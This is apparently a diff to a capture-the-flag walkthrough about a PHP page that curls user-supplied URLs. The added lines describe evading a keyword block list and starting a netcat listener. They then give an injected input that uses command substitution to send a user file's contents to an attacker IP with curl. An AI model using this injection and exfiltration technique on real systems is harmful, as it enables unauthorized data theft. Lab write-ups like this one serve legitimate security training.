@@ -88,4 +88,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /uploads (Status: 301)
 /exposed.php (Status: 200)
 ```
-The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it.
+The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some command but some symbols/keywords were blocked e.g. &, | (pipe), python and nc. Curl flags are not blocked, though.
+
+Checking `curl` man's page for ways to get more information about the system, I thought of sending information through body data. That was enough for getting the user flag.
+
+Set up listener from attacker: `nc -lvp 4444`
+
+Add the following to the input in /exposed.php: 
+```
+curl $ATTACKERIP:4444 -d `cat /home/maria/Desktop/user`
+```
